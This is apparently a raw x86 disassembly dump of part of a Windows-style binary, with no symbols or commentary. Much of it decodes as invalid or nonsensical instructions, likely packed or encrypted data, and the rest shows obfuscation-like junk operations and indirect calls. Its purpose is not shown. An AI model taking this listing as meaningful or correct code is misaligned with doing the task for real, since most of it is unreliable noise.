  4065e6:	and    al,0xd5
  4065e8:	add    esi,DWORD PTR [edi-0x4d3fb924]
  4065ee:	jg     0x406630
  4065f0:	sub    dh,BYTE PTR [edx]
  4065f2:	call   0x74473da2
  4065f7:	inc    esi
  4065f8:	stos   DWORD PTR es:[edi],eax
  4065f9:	jmp    0x94c25017
  4065fe:	adc    eax,0x6027992
  406603:	jecxz  0x40661e
  406605:	pop    es
  406606:	into   
  406607:	cdq    
  406608:	outs   dx,DWORD PTR ds:[esi]
  406609:	(bad)  
  40660a:	push   edi
  40660b:	das    
  40660c:	xchg   ebx,eax
  40660d:	pop    es
  40660e:	fcomi  st,st(2)
  406610:	or     al,0x77
  406612:	out    0xb9,eax
  406614:	lea    ebp,[edx+0x47]
  406617:	sub    BYTE PTR [edi+0x3c22a967],al
  40661d:	mov    al,ds:0xe9459bcf
  406622:	lahf   
  406623:	stos   DWORD PTR es:[edi],eax
  406624:	and    al,0xe
  406626:	push   ds
  406627:	or     DWORD PTR [eax-0x5e8e2f7e],0xfffffff1
  40662e:	add    al,0x63
  406630:	nop
  406631:	push   0xe70bcf01
  406636:	(bad)  
  406637:	imul   esi,DWORD PTR [ebx-0x15],0xffffffe3
  40663b:	and    BYTE PTR [ebx-0x5a18ea9a],0x65
  406642:	or     BYTE PTR [esi+edx*2+0x7a],ah
  406646:	(bad)  
  406647:	sbb    al,0x4
  406649:	das    
  40664a:	repz push ecx
  40664c:	loop   0x4065e3
  40664e:	jl     0x4066ba
  406650:	sub    edx,DWORD PTR [ecx+0x3e886c3c]
  406656:	aam    0xe3
  406658:	pop    esp
  406659:	in     eax,dx
  40665a:	mov    DWORD PTR [esi-0x28],edx
  40665d:	or     ah,dh
  40665f:	dec    ebp
  406660:	hlt    
  406661:	pop    es
  406662:	adc    ch,BYTE PTR [edx+0x12]
  406665:	mov    dh,0x15
  406667:	xchg   ecx,eax
  406668:	cs sub al,0x6f
  40666b:	xchg   ecx,eax
  40666c:	cmp    BYTE PTR [ecx+0x73],ah
  40666f:	push   ecx
  406670:	jle    0x4066b6
  406672:	jl     0x406612
  406674:	sbb    al,0x2
  406676:	ror    BYTE PTR [edx-0x470cbd6a],cl
  40667c:	pop    edx
  40667d:	aaa    
  40667e:	arpl   dx,ax
  406680:	not    DWORD PTR [edx+0x57]
  406683:	inc    esi
  406684:	popa   
  406685:	pop    ebx
  406686:	les    ebx,FWORD PTR [ecx-0x70ff43b0]
  40668c:	int3   
  40668d:	mov    ds:0xdf8484b5,al
  406692:	int3   
  406693:	xor    al,0x28
  406695:	lahf   
  406696:	stos   BYTE PTR es:[edi],al
  406697:	jmp    0x5bb5:0xdd7a4ead
  40669e:	fwait
  40669f:	in     al,0x29
  4066a1:	dec    esi
  4066a2:	pop    ds
  4066a3:	and    eax,DWORD PTR [ebx-0x476dc449]
  4066a9:	ja     0x406661
  4066ab:	mov    ebx,ecx
  4066ad:	mov    ecx,DWORD PTR [esi]
  4066af:	mov    edx,DWORD PTR [esi+0x4]
  4066b2:	mov    edx,ecx
  4066b4:	shl    edx,0x1e
  4066b7:	xor    edx,0x80000000
  4066bd:	mov    DWORD PTR [ebp+0x14],edx
  4066c0:	mov    edx,DWORD PTR [esi]
  4066c2:	mov    edi,DWORD PTR [esi+0x4]
  4066c5:	xor    edi,0x9d2b8af8
  4066cb:	xor    edx,eax
  4066cd:	shrd   edx,edi,0x2
  4066d1:	shr    edi,0x2
  4066d4:	or     edi,DWORD PTR [ebp+0x14]
  4066d7:	xor    ecx,ecx
  4066d9:	or     edx,ecx
  4066db:	mov    ecx,DWORD PTR [ebx]
  4066dd:	mov    DWORD PTR [ebp+0xc],edi
  4066e0:	mov    edi,DWORD PTR [ebx+0x4]
  4066e3:	mov    edi,ecx
  4066e5:	xor    ecx,ecx
  4066e7:	shl    edi,0x1e
  4066ea:	mov    DWORD PTR [ebp+0x10],ecx
  4066ed:	mov    ecx,DWORD PTR [ebx]
  4066ef:	xor    edi,0x80000000
  4066f5:	mov    DWORD PTR [ebp+0x14],edi
  4066f8:	mov    edi,DWORD PTR [ebx+0x4]
  4066fb:	xor    eax,ecx
  4066fd:	xor    edi,0x9d2b8af8
  406703:	mov    ecx,edi
  406705:	shrd   eax,ecx,0x2
  406709:	or     eax,DWORD PTR [ebp+0x10]
  40670c:	shr    ecx,0x2
  40670f:	or     ecx,DWORD PTR [ebp+0x14]
  406712:	cmp    edx,eax
  406714:	jne    0x4069cd
  40671a:	jmp    0x4069c4
  40671f:	cdq    
  406720:	add    dl,BYTE PTR [ecx+ebx*4+0x55]
  406724:	popf   
  406725:	popf   
  406726:	add    cl,BYTE PTR [eax+0x1771ff44]
  40672c:	mov    ch,0xfd
  40672e:	das    
  40672f:	pop    esp
  406730:	cs mov ebx,0xbbbfd0bb
  406736:	mov    ebx,0x52b0a6e3
  40673b:	mov    ds:0xd194b5d9,eax
  406740:	scas   al,BYTE PTR es:[edi]
  406741:	and    edi,ecx
  406743:	imul   esi,ecx,0x78
  406746:	pushf  
  406747:	mov    al,0xb4
  406749:	popf   
  40674a:	(bad)  
  40674d:	mov    dl,0x76
  40674f:	pop    ecx
  406750:	xchg   ebp,eax
  406751:	ret    0xf4d0
  406754:	adc    DWORD PTR [edi-0x57],0x787b9482
  40675b:	push   ebx
  40675c:	fsubr  DWORD PTR [ebx-0xf88f0db]
  406762:	in     eax,0xe6
  406764:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406765:	rcr    BYTE PTR [esi-0x3c8bdaca],1
  40676b:	or     BYTE PTR [edx+0x305b0e20],bh
  406771:	inc    ecx
  406772:	ror    DWORD PTR [edx-0x63ebd49e],1
  406778:	xchg   edx,eax
  406779:	push   ds
  40677a:	lahf   
  40677b:	retf   
  40677c:	out    0x12,eax
  40677e:	sbb    dl,BYTE PTR [ebp+ebx*4+0x251a7628]
  406785:	jnp    0x4067a0
  406787:	push   esi
  406788:	jecxz  0x4067b0
  40678a:	ds nop
  40678c:	jmp    0x40671d
  40678e:	test   BYTE PTR [edx-0x4c310ea0],0xec
  406795:	pop    ecx
  406796:	push   cs
  406797:	aaa    
  406798:	sub    DWORD PTR [esi-0x1d],ecx
  40679b:	(bad)  
  40679c:	and    cl,BYTE PTR [ebx-0x2a]
  40679f:	imul   edi,DWORD PTR [eax],0x47edaa94
  4067a5:	(bad)  [eax-0x12fef979]
  4067ab:	gs mov esp,0x7c85520a
  4067b1:	mov    edi,es
  4067b3:	pop    ebp
  4067b4:	add    BYTE PTR [ecx-0x1d20c198],bl
  4067ba:	dec    ecx
  4067bb:	dec    eax
  4067bc:	or     ch,cl
  4067be:	mov    ecx,0x9f0eeab7
  4067c3:	ret    0x26fa
  4067c6:	pop    edx
  4067c7:	lds    edi,FWORD PTR ds:0xb8368562
  4067cd:	cli    
  4067ce:	xor    edx,DWORD PTR [ecx-0x747fee1c]
  4067d4:	push   esi
  4067d5:	call   0xf2ba:0x35e320f2
  4067dc:	pop    ss
  4067dd:	div    DWORD PTR [eax]
  4067df:	call   0x15c:0x8a42d02f
  4067e6:	in     eax,0xc9
  4067e8:	test   al,0x66
  4067ea:	mov    al,0x18
  4067ec:	ds hlt 
  4067ee:	push   ss
  4067ef:	inc    eax
  4067f0:	add    al,0x26
  4067f2:	cld    
  4067f3:	(bad)  
  4067f5:	fisttp QWORD PTR [edx]
  4067f7:	ins    DWORD PTR es:[edi],dx
  4067f8:	mov    ah,0xd4
  4067fa:	sub    DWORD PTR ds:0x56ede51a,ebx
  406801:	aad    0xb0
  406803:	xchg   ebx,eax
  406804:	cmp    dl,dh
  406806:	push   eax
  406807:	add    BYTE PTR [eax-0x56],cl
  40680a:	mov    esp,0x358077a1
  40680f:	outs   dx,DWORD PTR ds:[esi]
  406810:	lods   al,BYTE PTR ds:[esi]
  406811:	push   ecx
  406812:	dec    esp
  406813:	test   eax,0xfe81ba45
  406818:	fisubr WORD PTR [ebx]
  40681a:	mov    edi,0x5cf9a468
  40681f:	scas   al,BYTE PTR es:[edi]
  406820:	push   ecx
  406821:	int    0x68
  406823:	std    
  406824:	js     0x40685a
  406826:	daa    
  406827:	cmp    BYTE PTR [eax+0x76],dl
  40682a:	dec    esi
  40682c:	int3   
  40682d:	popa   
  40682e:	fcmovnbe st,st(5)
  406830:	into   
  406831:	sbb    eax,0xcee96752
  406836:	xor    ebp,DWORD PTR [eax-0x1a]
  406839:	cmp    BYTE PTR [ecx+edx*1+0x5],0xa
  40683e:	add    dh,0x93
  406841:	addr16 lahf 
  406843:	cwde   
  406844:	pop    ss
  406845:	push   ecx
  406846:	nop
  406847:	jecxz  0x4067cb
  406849:	sbb    al,0x9f
  40684b:	mov    ch,0xdb
  40684d:	imul   esi,DWORD PTR [esi-0xaa4fbb4],0x81383551
  406857:	adc    cl,dh
  406859:	clc    
  40685a:	pop    edx
  40685b:	push   eax
  40685c:	inc    ebx
  40685d:	adc    esp,edi
  40685f:	jge    0x406865
  406861:	push   eax
  406862:	ins    DWORD PTR es:[edi],dx
  406863:	and    bh,0x8c
  406866:	or     dh,ch
  406868:	outs   dx,BYTE PTR ds:[esi]
  406869:	mov    ebx,0x6bca1139
  40686e:	pop    esi
  40686f:	fcomp  QWORD PTR [edx+ecx*1+0x3ae16d45]
  406876:	mov    eax,0x1c2f97cc
  40687b:	das    
  40687c:	mov    al,ch
  40687e:	out    dx,eax
  40687f:	jne    0x40682e
  406881:	mov    BYTE PTR ds:0x935822c1,cl
  406887:	bound  ecx,QWORD PTR [esi+esi*4+0x261dee80]
  40688e:	scas   eax,DWORD PTR es:[edi]
  40688f:	mov    ebp,ebx
  406891:	sbb    BYTE PTR [ebx-0x79165c32],al
  406897:	and    BYTE PTR [ebx-0x5da2b13a],0x31
  40689e:	jnp    0x4068fb
  4068a0:	sub    ecx,DWORD PTR [eax+0x5be539bd]
  4068a6:	add    al,0xc7
  4068a8:	jns    0x406865
  4068aa:	daa    
  4068ab:	(bad)  
  4068ad:	mov    dh,0x18
  4068af:	(bad)  
  4068b1:	enter  0x66a9,0xf1
  4068b5:	lods   al,BYTE PTR ds:[esi]
  4068b6:	lea    edx,[ebp-0x57]
  4068b9:	dec    edx
  4068ba:	popf   
  4068bb:	or     eax,0x6e765b64
  4068c0:	popa   
  4068c1:	rcr    BYTE PTR [ebx-0x67],cl
  4068c4:	mov    al,ds:0xdac3be3c
  4068c9:	pop    ebx
  4068ca:	sub    bl,BYTE PTR [edx]
  4068cc:	push   ss
  4068cd:	mov    gs,WORD PTR [ecx]
  4068cf:	jae    0x406880
  4068d1:	fild   DWORD PTR [eax+edx*1+0x1b6a2f99]
  4068d8:	add    eax,0xf329c839
  4068dd:	in     eax,0x2d
  4068df:	repz add cl,BYTE PTR [edx]
  4068e2:	bound  ecx,QWORD PTR [esi+0x1f]
  4068e5:	and    ah,ch
  4068e7:	push   ds
  4068e8:	imul   ebx,ebx,0xffffffeb
  4068eb:	pop    esp
  4068ec:	inc    eax
  4068ed:	jecxz  0x40687a
  4068ef:	adc    eax,0x23733b5e
  4068f4:	repnz jmp 0xead3:0x255a1517
  4068fc:	push   edi
  4068fd:	ss jne 0x406954
  406900:	inc    esi
  406901:	outs   dx,BYTE PTR ds:[esi]
  406902:	adc    cl,BYTE PTR [ebp-0x4e]
  406905:	push   cs
  406906:	add    esp,DWORD PTR [esi+0x7375585b]
  40690c:	bound  edi,QWORD PTR [ecx-0x71]
  40690f:	pop    ebx
  406910:	inc    edx
  406911:	push   ebp
  406912:	ja     0x406894
  406914:	sti    
  406915:	ja     0x4068e3
  406917:	iret   
  406918:	shl    BYTE PTR [edi+0x79],1
  40691b:	add    esp,edi
  40691d:	push   ss
  40691e:	xor    bh,al
  406920:	sahf   
  406921:	shr    esp,0xf5
  406924:	inc    ebx
  406925:	sbb    bh,BYTE PTR [eax-0x7320ccc5]
  40692b:	xlat   BYTE PTR ds:[ebx]
  40692c:	rcl    DWORD PTR [edi-0x6e],cl
  40692f:	shl    BYTE PTR [ecx+0x6c],1
  406932:	jp     0x40698c
  406934:	popa   
  406935:	fst    QWORD PTR [di]
  406938:	les    ebp,FWORD PTR [edx-0x60]
  40693b:	icebp  
  40693c:	cwde   
  40693d:	cs test BYTE PTR ds:[ebx-0x26],dl
  406942:	mov    ebx,0x19855eb7
  406947:	push   ds
  406948:	jecxz  0x40692d
  40694a:	(bad)  
  40694b:	in     eax,dx
  40694c:	not    BYTE PTR [edx-0x6ab696d]
  406952:	and    al,BYTE PTR [ecx+esi*2]
  406955:	add    DWORD PTR [ebx+0x7d058e71],0x33783b60
  40695f:	mov    cl,al
  406961:	jbe    0x406901
  406963:	ins    BYTE PTR es:[edi],dx
  406964:	pop    DWORD PTR [esi]
  406966:	push   ebp
  406967:	add    ch,BYTE PTR [ecx+0x75cf0d55]
  40696d:	mov    BYTE PTR [ebp-0x7f],bh
  406970:	pop    esi
  406971:	and    DWORD PTR [ebx],esi
  406973:	scas   eax,DWORD PTR es:[edi]
  406974:	mov    esi,0x2f766e68
  406979:	sub    bh,BYTE PTR [ebx]
  40697b:	lods   eax,DWORD PTR ds:[esi]
  40697c:	or     edi,DWORD PTR gs:[edi-0x304d6115]
  406983:	sub    al,0x65
  406985:	add    eax,0xfbb6da09
  40698a:	sbb    eax,0x75e7ef07
  40698f:	out    dx,eax
  406990:	push   ss
  406991:	mov    ds,WORD PTR [ecx+0x3c1c761f]
  406997:	dec    edi
  406998:	arpl   si,bp
  40699a:	stos   DWORD PTR es:[edi],eax
  40699b:	scas   al,BYTE PTR es:[edi]
  40699c:	mov    ss,ecx
  40699e:	popa   
  40699f:	ja     0x406a01
  4069a1:	test   BYTE PTR [edi+edi*1+0x17c7c732],cl
  4069a8:	mov    ebx,0xa3475829
  4069ad:	xchg   edx,eax
  4069ae:	call   0x814ace97
  4069b3:	lods   al,BYTE PTR ds:[esi]
  4069b4:	and    edx,edi
  4069b6:	mov    eax,0x12caedf3
  4069bb:	jo     0x4069f2
  4069bd:	mov    ds:0xc03afb31,eax
  4069c2:	pop    edx
  4069c3:	mov    bh,BYTE PTR [ecx]
  4069c5:	dec    ebp
  4069c6:	or     al,0xf
  4069c8:	test   BYTE PTR [eax],dl
  4069ca:	add    BYTE PTR [eax],al
  4069cc:	add    bh,bh
  4069ce:	jne    0x4069f0
  4069d0:	push   DWORD PTR [ebp+0x1c]
  4069d3:	push   DWORD PTR [ebp+0x18]
  4069d6:	push   ebx
  4069d7:	push   esi
  4069d8:	call   0x4113ee
  4069dd:	pop    edi
  4069de:	leave  
  4069df:	ret    0x1c
  4069e2:	cmp    cl,0x40
  4069e5:	jmp    0x406c73
  4069ea:	adc    edi,ecx
  4069ec:	(bad)  
  4069ed:	out    dx,eax
  4069ee:	or     eax,0xce3439f7
  4069f3:	test   eax,0x4d9efbd0
  4069f8:	xor    DWORD PTR gs:[ebx+0x32],ebp
  4069fc:	mov    ebx,0xbbbf98bb
  406a01:	mov    ebx,0x4050c882
  406a06:	aaa    
  406a07:	in     al,0x25
  406a09:	dec    edi
  406a0a:	push   eax
  406a0b:	xchg   ebp,eax
  406a0c:	in     al,dx
  406a0d:	add    ch,dl
  406a0f:	sbb    bh,ch
  406a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a12:	outs   dx,BYTE PTR ds:[esi]
  406a13:	lock dec esp
  406a15:	pop    eax
  406a16:	jecxz  0x4069c2
  406a18:	and    al,0x91
  406a1a:	xchg   DWORD PTR [ebx+0x2fc1ba0d],edi
  406a20:	and    edi,edi
  406a22:	inc    ebx
  406a23:	mov    ch,0xf9
  406a25:	push   cs
  406a26:	cli    
  406a27:	ss mov cl,0x96
  406a2a:	xlat   BYTE PTR ds:[ebx]
  406a2b:	inc    ebp
  406a2c:	mov    ecx,0xb433b6bf
  406a31:	adc    esp,DWORD PTR [edx+0x3]
  406a34:	mov    edx,DWORD PTR [eax+0x23]
  406a37:	mov    eax,ds:0xfea9434b
  406a3c:	and    esi,DWORD PTR [edx-0x27a25070]
  406a42:	jp     0x406a42
  406a44:	scas   eax,DWORD PTR es:[edi]
  406a45:	int    0x58
  406a47:	jae    0x406a0c
  406a49:	inc    al
  406a4b:	adc    al,0xdd
  406a4d:	in     al,dx
  406a4e:	inc    DWORD PTR [edx+0x65c9bb0e]
  406a54:	sub    eax,0x233e47cb
  406a59:	ds mov edi,0x896eac65
  406a5f:	mov    al,0x30
  406a61:	dec    edx
  406a62:	mov    ebp,0x4517ae1d
  406a67:	xchg   ebp,eax
  406a68:	mov    ebp,0x1567fb49
  406a6d:	lods   eax,DWORD PTR ds:[esi]
  406a6e:	lods   eax,DWORD PTR ds:[esi]
  406a6f:	add    al,0x0
  406a71:	out    dx,eax
  406a72:	jmp    0xaf099421
  406a77:	mov    ds:0xe5d13abf,eax
  406a7c:	call   0x313eee0f
  406a81:	clc    
  406a82:	cmp    al,BYTE PTR [edx]
  406a84:	mov    dh,0x68
  406a86:	fs xchg edi,eax
  406a88:	push   ebx
  406a89:	pop    ebx
  406a8a:	push   esi
  406a8b:	in     eax,0xc
  406a8d:	mov    ch,0x28
  406a8f:	rcr    ah,1
  406a91:	out    dx,al
  406a92:	inc    esi
  406a93:	(bad)  
  406a94:	int3   
  406a95:	lock test DWORD PTR [ecx*8+0x1459b190],0x4af4469c
  406aa1:	mov    BYTE PTR [ebx],cl
  406aa3:	sti    
  406aa4:	ds loope 0x406b10
  406aa7:	pusha  
  406aa8:	sahf   
  406aa9:	cmp    DWORD PTR [ebx+0xeaf2b96],eax
  406aaf:	xchg   ecx,eax
  406ab0:	xlat   BYTE PTR ds:[ebx]
  406ab1:	push   esp
  406ab2:	sbb    dl,bh
  406ab4:	or     ecx,DWORD PTR [edx-0x3fcba8a3]
  406aba:	je     0x406a4c
  406abc:	mov    dh,ch
  406abe:	loope  0x406a47
  406ac0:	stos   DWORD PTR es:[edi],eax
  406ac1:	inc    esi
  406ac2:	ret    
  406ac3:	and    al,0xd6
  406ac5:	addr16 popf 
  406ac7:	out    dx,eax
  406ac8:	and    eax,0xbfbd2240
  406acd:	push   ss
  406ace:	mov    eax,0x6100c187
  406ad3:	in     al,dx
  406ad4:	jb     0x406a65
  406ad6:	sbb    BYTE PTR [edx+0x5b63576c],ch
  406adc:	inc    ecx
  406add:	stc    
  406ade:	pop    ss
  406adf:	fsub   DWORD PTR [ebx-0x6aaed151]
  406ae5:	ds retf 
  406ae7:	sub    eax,0xc82ad1f7
  406aec:	jb     0x406b54
  406aee:	outs   dx,BYTE PTR ds:[esi]
  406aef:	mov    edx,ebx
  406af1:	shr    esp,0xc9
  406af4:	fldenv [esi+0xb]
  406af7:	sub    dh,BYTE PTR [ecx+0x52a21bb6]
  406afd:	dec    ebp
  406afe:	mov    edx,0xc8072610
  406b03:	imul   DWORD PTR [edi+0x58]
  406b06:	int    0x20
  406b08:	or     edx,ebp
  406b0a:	hlt    
  406b0b:	fwait
  406b0c:	sub    BYTE PTR [edx+0x45],al
  406b0f:	out    dx,eax
  406b10:	xlat   BYTE PTR ds:[ebx]
  406b11:	repnz repnz enter 0x23bf,0xe5
  406b17:	xor    DWORD PTR [ebp-0x2d0307c4],edi
  406b1d:	jb     0x406b58
  406b1f:	lahf   
  406b20:	sbb    dl,bh
  406b22:	mov    ebx,0x5f82381
  406b27:	and    eax,0xaf5bd7c1
  406b2c:	mov    bh,BYTE PTR [esi+0x3528837f]
  406b32:	sti    
  406b33:	iret   
  406b34:	icebp  
  406b35:	ret    
  406b36:	mov    dh,BYTE PTR [edi+0x59a62a0]
  406b3c:	std    
  406b3d:	push   ecx
  406b3e:	sbb    BYTE PTR [ebp+0x1f35849d],dl
  406b44:	cli    
  406b45:	sub    ecx,eax
  406b47:	xchg   ecx,eax
  406b48:	jecxz  0x406b87
  406b4a:	aas    
  406b4b:	scas   al,BYTE PTR es:[edi]
  406b4c:	mov    dh,0x1c
  406b4e:	jecxz  0x406b5d
  406b50:	cmp    eax,0x397e840c
  406b55:	add    bh,BYTE PTR [esi+0x35739494]
  406b5b:	(bad)  
  406b5c:	mov    ds:0x5d85b4eb,al
  406b61:	cs xchg edi,eax
  406b63:	mov    ecx,0x2ff178f7
  406b68:	mov    esp,0x6a4274ec
  406b6d:	loopne 0x406b28
  406b6f:	add    dl,BYTE PTR [edx-0x3d096442]
  406b75:	(bad)  
  406b76:	stc    
  406b77:	cmp    ecx,DWORD PTR [eax+0x4c]
  406b7a:	dec    esi
  406b7b:	cmc    
  406b7c:	or     edi,eax
  406b7e:	mov    dl,cl
  406b80:	mov    ebp,0x3ab5817a
  406b85:	fisttp WORD PTR [ebp-0x40b7b8ca]
  406b8b:	sbb    ch,ch
  406b8d:	mov    ds:0x19034028,al
  406b92:	lods   eax,DWORD PTR ds:[esi]
  406b93:	jg     0x406b52
  406b95:	aad    0x6a
  406b97:	dec    eax
  406b98:	mov    ds:0x78c4db2c,eax
  406b9d:	lods   al,BYTE PTR ds:[esi]
  406b9e:	jmp    0x406b7f
  406ba0:	adc    BYTE PTR ds:0xa63cc424,0x92
  406ba7:	jbe    0x406be7
  406ba9:	mov    esi,0x552275b1
  406bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406baf:	mov    edi,0x4bb17bd9
  406bb4:	jge    0x406bf2
  406bb6:	(bad)  
  406bb8:	jo     0x406be8
  406bba:	mov    fs,WORD PTR [edx-0x1d]
  406bbd:	je     0x406bf7
  406bbf:	icebp  
  406bc0:	push   esp
  406bc1:	cmc    
  406bc2:	or     al,0x64
  406bc4:	xchg   ch,ah
  406bc6:	fst    QWORD PTR [esi]
  406bc8:	mov    cl,0x8
  406bca:	icebp  
  406bcb:	pop    ebp
  406bcc:	mov    ch,0x59
  406bce:	jmp    0x406bbf
  406bd0:	enter  0xdf62,0xcd
  406bd4:	mov    BYTE PTR [esi-0x6d8bae72],0x3b
  406bdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bdc:	xchg   DWORD PTR [ecx+edi*4+0xe],ebx
  406be0:	or     al,0x18
  406be2:	push   0x85fa9874
  406be7:	(bad)  
  406be8:	xor    eax,0x7b669048
  406bed:	adc    al,0x71
  406bef:	pusha  
  406bf0:	pop    esi
  406bf1:	(bad)  
  406bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bf3:	cmp    BYTE PTR [eax-0x2fb01eb7],dh
  406bf9:	jg     0x406bb3
  406bfb:	in     eax,dx
  406bfc:	mov    cs,edi
  406bfe:	xchg   edi,eax
  406bff:	fst    st(2)
  406c01:	out    0xd4,al
  406c03:	cld    
  406c04:	jl     0x406c1a
  406c06:	cwde   
  406c07:	adc    ebp,DWORD PTR [edx-0x31]
  406c0a:	cli    
  406c0b:	popf   
  406c0c:	sbb    BYTE PTR [eax-0x43],cl
  406c0f:	inc    esp
  406c10:	int    0x35
  406c12:	pop    edx
  406c13:	call   0xd1f6fa58
  406c18:	mov    eax,DWORD PTR [ebx-0x648ba6c8]
  406c1e:	jmp    0x406c27
  406c20:	sbb    eax,0x13059394
  406c25:	inc    BYTE PTR [ebp+0x15]
  406c28:	xor    dh,BYTE PTR [edx*8+0x69b67a71]
  406c2f:	pusha  
  406c30:	add    BYTE PTR [edi+0x54],bh
  406c33:	add    BYTE PTR [esi],cl
  406c35:	nop
  406c36:	xor    DWORD PTR [ebp+edi*4-0x41],eax
  406c3a:	mov    al,ds:0xfc35a9d9
  406c3f:	ja     0x406cab
  406c41:	sbb    eax,0x9aef97ae
  406c46:	push   ss
  406c47:	(bad)  
  406c48:	push   eax
  406c49:	add    BYTE PTR [ebx],cl
  406c4b:	cs jmp 0x3ffd:0xc278fb8a
  406c53:	dec    edx
  406c54:	cwde   
  406c55:	clc    
  406c56:	aas    
  406c57:	or     al,0x57
  406c59:	and    DWORD PTR [esi],eax
  406c5b:	mov    es,WORD PTR [ebx+0x2db9ee01]
  406c61:	mov    cl,0xfa
  406c63:	or     eax,0x7e6d398
  406c68:	je     0x406cbb
  406c6a:	(bad)
  406c6e:	push   ds
  406c6f:	popf   
  406c70:	adc    ecx,DWORD PTR [edx+ebx*2]
  406c73:	jae    0x406cbf
  406c79:	mov    DWORD PTR ds:0x4282d1,0x13ab
  406c83:	cmp    cl,0x20
  406c86:	jae    0x406c9c
  406c8c:	add    DWORD PTR ds:0x428285,0x4282cd
  406c96:	shrd   eax,edx,cl
  406c99:	shr    edx,cl
  406c9b:	ret    
  406c9c:	sub    eax,0x44cc
  406ca1:	mov    eax,edx
  406ca3:	and    DWORD PTR ds:0x428209,0x4282b5
  406cad:	xor    edx,edx
  406caf:	mov    DWORD PTR ds:0x428231,0x7eea
  406cb9:	and    cl,0x1f
  406cbc:	shr    eax,cl
  406cbe:	ret    
  406cbf:	xor    eax,eax
  406cc1:	xor    edx,edx
  406cc3:	ret    
  406cc4:	push   ebp
  406cc5:	mov    ebp,esp
  406cc7:	sub    esp,0x28
  406cca:	cmp    DWORD PTR ds:0x428289,0x0
  406cd1:	mov    ecx,DWORD PTR ds:0x428241
  406cd7:	not    ecx
  406cd9:	mov    DWORD PTR ds:0x428281,0x4d3f
  406ce3:	mov    DWORD PTR ds:0x428285,0x4bd9
  406ced:	jmp    0x406d4e
  406cf2:	mov    eax,0x31d6
  406cf7:	cmp    DWORD PTR ds:0x428289,0x0
  406cfe:	jae    0x406d31
  406d04:	push   0x2a88
  406d09:	push   0x3080
  406d0e:	push   0x4281a5
  406d13:	call   DWORD PTR ds:0x4289cc
  406d19:	add    ecx,0x7104
  406d1f:	mov    ecx,DWORD PTR ds:0x428235
  406d25:	sub    DWORD PTR ds:0x428205,ecx
  406d2b:	sbb    ecx,DWORD PTR ds:0x428241
  406d31:	movzx  ecx,BYTE PTR ds:0x428191
  406d38:	xor    DWORD PTR ds:0x4282c5,ecx
  406d3e:	xor    DWORD PTR ds:0x428211,0x52df
  406d48:	neg    DWORD PTR ds:0x428281
  406d4e:	push   esi
  406d4f:	adc    eax,ecx
  406d51:	push   edi
  406d52:	mov    DWORD PTR [ebp-0x28],0xcb89b676
  406d59:	cmp    DWORD PTR ds:0x42819d,0x0
  406d60:	mov    ecx,DWORD PTR ds:0x428209
  406d66:	mov    DWORD PTR ds:0x42821d,ecx
  406d6c:	not    DWORD PTR ds:0x42821d
  406d72:	jmp    0x40716f
  406d77:	mov    DWORD PTR ds:0x4282b5,ecx
  406d7d:	cmp    DWORD PTR ds:0x42819d,0x0
  406d84:	jne    0x406db2
  406d8a:	push   0x42808f
  406d8f:	call   DWORD PTR ds:0x428a70
  406d95:	sbb    DWORD PTR ds:0x4282cd,0x2caa
  406d9f:	movzx  ecx,BYTE PTR ds:0x428271
  406da6:	and    ecx,DWORD PTR ds:0x42820d
  406dac:	mov    DWORD PTR ds:0x428271,ecx
  406db2:	and    ecx,ecx
  406db4:	add    DWORD PTR ds:0x4281a9,0x50fb
  406dbe:	sbb    DWORD PTR ds:0x428205,0x6ad6
  406dc8:	sub    ecx,0x18c2
  406dce:	cmp    DWORD PTR ds:0x428285,0x0
  406dd5:	not    DWORD PTR ds:0x4282b5
  406ddb:	mov    DWORD PTR ds:0x428209,0x1cc2
  406de5:	mov    DWORD PTR ds:0x4282b9,0x4f21
  406def:	jmp    0x40716f
  406df4:	mov    eax,0x6563
  406df9:	cmp    DWORD PTR ds:0x428285,0x0
  406e00:	jl     0x406e47
  406e06:	push   0x8d99
  406e0b:	push   DWORD PTR [ebp-0x10]
  406e0e:	push   DWORD PTR [ebp-0x20]
  406e11:	push   0x8465
  406e16:	push   DWORD PTR [ebp-0x10]
  406e19:	push   0x14ed
  406e1e:	push   0x5d7b
  406e23:	call   DWORD PTR ds:0x4289d0
  406e29:	and    ecx,0x7e91
  406e2f:	inc    ecx
  406e30:	sbb    DWORD PTR ds:0x4281a5,0x42f8
  406e3a:	movzx  ecx,WORD PTR ds:0x4282bd
  406e41:	adc    DWORD PTR ds:0x428289,ecx
  406e47:	sbb    DWORD PTR ds:0x428289,0x7f7e
  406e51:	or     DWORD PTR ds:0x428285,0x45d1
  406e5b:	cmp    DWORD PTR ds:0x428191,0x0
  406e62:	mov    ecx,0x6a77
  406e67:	mov    DWORD PTR ds:0x4282c1,0x4fb6
  406e71:	mov    ecx,DWORD PTR ds:0x4282b5
  406e77:	jmp    0x40716f
  406e7c:	mov    eax,ds:0x428271
  406e81:	mov    DWORD PTR ds:0x4281fd,ebx
  406e87:	cmp    DWORD PTR ds:0x428191,0x0
  406e8e:	jge    0x406ec0
  406e94:	push   0x7f3b
  406e99:	push   0x3967
  406e9e:	call   DWORD PTR ds:0x4289d4
  406ea4:	and    ecx,ecx
  406ea6:	mov    ecx,DWORD PTR ds:0x4282a1
  406eac:	mov    ecx,DWORD PTR [ecx]
  406eae:	sub    DWORD PTR ds:0x4281a5,ecx
  406eb4:	and    ecx,ecx
  406eb6:	and    DWORD PTR ds:0x428231,0x3549
  406ec0:	sbb    ecx,ecx
  406ec2:	mov    ecx,DWORD PTR ds:0x42822d
  406ec8:	and    ecx,DWORD PTR ds:0x428229
  406ece:	mov    DWORD PTR ds:0x42822d,ecx
  406ed4:	or     ecx,ecx
  406ed6:	jmp    0x40716f
  406edb:	les    edi,FWORD PTR [eax-0x65]
  406ede:	mov    esp,0xb9dcbdb7
  406ee3:	out    dx,al
  406ee4:	bound  edi,QWORD PTR [edi+0x3b]
  406ee7:	js     0x406ec9
  406ee9:	push   DWORD PTR [ecx+0x48]
  406eec:	cmp    al,0xbb
  406eee:	mov    ebx,0xbbbbbfaa
  406ef3:	jno    0x406f6e
  406ef5:	sar    BYTE PTR [ebx],cl
  406ef7:	mov    BYTE PTR [edx-0x1a],dl
  406efa:	mov    ecx,ebp
  406efc:	aas    
  406efd:	adc    DWORD PTR [edi],ebx
  406eff:	popf   
